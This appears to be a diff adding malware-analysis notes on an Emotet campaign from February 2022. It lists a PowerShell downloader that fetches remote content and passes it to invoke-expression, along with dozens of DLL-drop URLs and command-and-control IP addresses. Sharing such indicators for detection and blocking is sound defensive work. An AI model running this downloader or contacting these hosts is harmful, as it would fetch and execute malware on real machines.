@@ -1,0 +1,73 @@
+Emotet - e5 - 08.02.2022
+
+.xls 
+
+.dll 
+
+
+
+
+# powershell snippet 0
+$c1 = "(New-Object Net.We"
+$c4 = "bClient).Downlo"
+$c3 = "adString('http://91.240.118.172/ss/ss.png')"
+$ji = "(New-Object Net.WebClient).DownloadString('http://91.240.118.172/ss/ss.png')"
+invoke-expression "(New-Object Net.WebClient).DownloadString('http://91.240.118.172/ss/ss.png')"|invoke-expression
+# powershell snippet 1
+(new-object net.webclient).downloadstring("http://91.240.118.172/ss/ss.png")
+
+
+.dll drop
+
+http://mkdevcorp.com/cgi/33HhffLF60pcv/
+http://goncalves.com/counter/3OkjcVmCPdokTG/
+http://francisdifronzo.com/eln-images/T6yB/
+http://k7tgu.com/Bryce/UBfCU05bih/
+http://ronfrankproductions.com/4agreements/trEgS/
+http://topstravel.com/VPImages/dPW/
+http://urieprocor.com/cgi/m2m7z88gOsNceL/
+http://mardigrasslandscaping.com/cgi/w4BV/
+http://keyesforsteuben.com/cgi/vnBHCHIlWZx/
+http://casualenglishchat.com/cgi/6g0pcvCOYPZYn/
+http://grimmcm.com/cgi/6hoBPCb3E/
+http://intelfirm.com/eln-images/xaTiPeapzK/
+http://manningind.com/eln-images/rx7j2VVFK/
+
+
+c2's
+
+103.42.57.17:8080
+93.104.208.37:8080
+195.154.146.35:443
+62.171.178.147:8080
+37.59.209.141:8080
+139.196.72.155:8080
+37.44.244.177:8080
+191.252.103.16:80
+217.182.143.207:443
+128.199.192.135:8080
+103.41.204.169:8080
+185.148.168.15:8080
+168.197.250.14:80
+78.46.73.125:443
+194.9.172.107:8080
+185.148.168.220:8080
+118.98.72.86:443
+54.37.106.167:8080
+78.47.204.80:443
+159.69.237.188:443
+116.124.128.206:8080
+59.148.253.194:443
+85.214.67.203:8080
+185.184.25.78:8080
+173.203.78.138:443
+54.37.228.122:443
+198.199.98.78:8080
+195.77.239.39:8080
+210.57.209.142:8080
+66.42.57.149:443
+104.131.62.48:8080
+54.38.242.185:443
+190.90.233.66:443
+207.148.81.119:8080
+203.153.216.46:443
